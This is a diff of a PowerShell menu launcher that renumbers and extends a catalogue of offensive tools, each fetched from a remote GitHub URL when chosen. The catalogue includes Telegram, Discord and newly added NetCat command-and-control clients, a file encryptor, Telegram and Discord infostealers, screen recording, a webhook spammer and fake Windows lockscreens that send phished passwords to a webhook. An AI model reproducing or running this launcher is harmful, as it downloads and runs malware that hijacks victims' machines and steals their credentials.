@@ -35,26 +35,26 @@ Write-Host "$header"
 }
 
 $list = "==============================================================================
+=                                                                            =
 = C2 Clients                               System Information                =
-= 1.  Telegram C2 Client                   13. Telegram Infoscrape           =
-= 2.  Discord C2 Client                    14. Discord Infoscrape            =
-= 3.  LAN Tools                            15. Netcat Screenshare            =
+= 1.  Telegram C2 Client                   14. Telegram Infoscrape           =
+= 2.  Discord C2 Client                    15. Discord Infoscrape            =
+= 3.  NetCat C2 Client                     16. Netcat Screenshare            =
+= 4.  LAN Toolset                                                            =
+=                                          Console Tools                     =
+= Encryption                               17. Minecraft Server Scanner      =
+= 5.  Encryptor                            18. Console Task Manager          =
+= 6.  Decryptor                            19. Dummy Folder Creator          =
+=                                          20. Image To Console              =
+= GUI Tools                                21. Matrix Cascade                =
+= 7.  Search Folders for Filetypes                                           =
+= 8.  Record the Screen                    Phishing to Discord               =
+= 9.  Network Enumeration                  22. Windows 10 Lockscreen         =
+= 10.  Mute Microphone                     23. Windows 11 Lockscreen         =
+= 11. Webhook Spammer                                                        =
+= 12. Social Search                        Exit                              =
+= 13. GDI effects                          99. Close Program                 =
 =                                                                            =
-= Encryption                               Console Tools                     =
-= 4.  Encryptor                            16. Minecraft Server Scanner      =
-= 5.  Decryptor                            17. Console Task Manager          =
-=                                          18. Dummy Folder Creator          =
-= GUI Tools                                19. Image To Console              =
-= 6.  Search Folders for Filetypes         20. Matrix Cascade                =
-= 7.  Record the Screen                                                      =
-= 8.  Network Enumeration                  Phishing to Discord               =
-= 9.  Mute Microphone                      21. Windows 10 Lockscreen         =
-= 10. Webhook Spammer                      22. Windows 11 Lockscreen         =
-= 11. Social Search                                                          =
-= 12. GDI effects                                                            =
-=                                                                            =
-= Exit                                                                       =
-= 99. Exit Program                                                           =
 ==============================================================================
 Choose an option "
 
@@ -64,30 +64,32 @@ $Option = Read-Host "$list"
 
     if ($Option -eq '1'){$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
     if ($Option -eq '2'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
-    if ($Option -eq '3'){$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
-    if ($Option -eq '4'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main/Encryption/Encryptor.ps1"}
-    if ($Option -eq '5'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main/Decryption/Decryptor-GUI.ps1"}
+    if ($Option -eq '3'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/NC-Func.ps1"}
+    if ($Option -eq '4'){$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
+
+    if ($Option -eq '5'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main/Encryption/Encryptor.ps1"}
+    if ($Option -eq '6'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main/Decryption/Decryptor-GUI.ps1"}
     
-    if ($Option -eq '6'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Search-Folders-For-Filetypes-GUI.ps1"}
-    if ($Option -eq '7'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Record-Screen-GUI.ps1"}
-    if ($Option -eq '8'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Network-Enumeration-GUI.ps1"}
-    if ($Option -eq '9'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Mute-Microphone-GUI.ps1"}
-    if ($Option -eq '10'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Discord-Webhook-Spammer-GUI.ps1"}
-    if ($Option -eq '11'){$url = "https://github.com/beigeworm/assets/blob/main/master/Social-Search-GUI.ps1"}
-    if ($Option -eq '12'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Desktop-GDI-Efects-GUI.ps1"}
+    if ($Option -eq '7'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Search-Folders-For-Filetypes-GUI.ps1"}
+    if ($Option -eq '8'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Record-Screen-GUI.ps1"}
+    if ($Option -eq '9'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Network-Enumeration-GUI.ps1"}
+    if ($Option -eq '10'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Mute-Microphone-GUI.ps1"}
+    if ($Option -eq '11'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Discord-Webhook-Spammer-GUI.ps1"}
+    if ($Option -eq '12'){$url = "https://github.com/beigeworm/assets/blob/main/master/Social-Search-GUI.ps1"}
+    if ($Option -eq '13'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Desktop-GDI-Efects-GUI.ps1"}
     
-    if ($Option -eq '13'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Telegram-InfoStealer.ps1"}
-    if ($Option -eq '14'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Discord-Infostealer.ps1"}
-    if ($Option -eq '15'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Desktop-Screenshare-over-Netcat.ps1"}
+    if ($Option -eq '14'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Telegram-InfoStealer.ps1"}
+    if ($Option -eq '15'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Discord-Infostealer.ps1"}
+    if ($Option -eq '16'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Desktop-Screenshare-over-Netcat.ps1"}
     
-    if ($Option -eq '16'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Minecraft-Server-Scanner-and-Server-Info.ps1"}
-    if ($Option -eq '17'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Console-Task-Manager.ps1"}
-    if ($Option -eq '18'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Dummy-Folder-Creator.ps1"}
-    if ($Option -eq '19'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Image-to-Console.ps1"}
-    if ($Option -eq '20'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Matrix-Cascade-in-Powershell.ps1"}
+    if ($Option -eq '17'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Minecraft-Server-Scanner-and-Server-Info.ps1"}
+    if ($Option -eq '18'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Console-Task-Manager.ps1"}
+    if ($Option -eq '19'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Dummy-Folder-Creator.ps1"}
+    if ($Option -eq '20'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Image-to-Console.ps1"}
+    if ($Option -eq '21'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Matrix-Cascade-in-Powershell.ps1"}
     
-    if ($Option -eq '21'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
-    if ($Option -eq '22'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
+    if ($Option -eq '22'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
+    if ($Option -eq '23'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
 
     if ($Option -eq '99'){Write-Host "Closing Script";sleep 1; break}
     else{Write-Host "No valid option selected."}
@@ -96,7 +98,7 @@ $Option = Read-Host "$list"
     while ($Option -ne '99'){
     Header
 
-        if (($Option -eq '4') -or ($Option -eq '5') -or ($Option -eq '12')){
+        if (($Option -eq '5') -or ($Option -eq '6')){
             Header
             $danger = Read-Host "THIS IS A DANGEROUS SCRIPT - ARE YOU SURE? (Y/N)"
         if ($danger -eq 'n'){
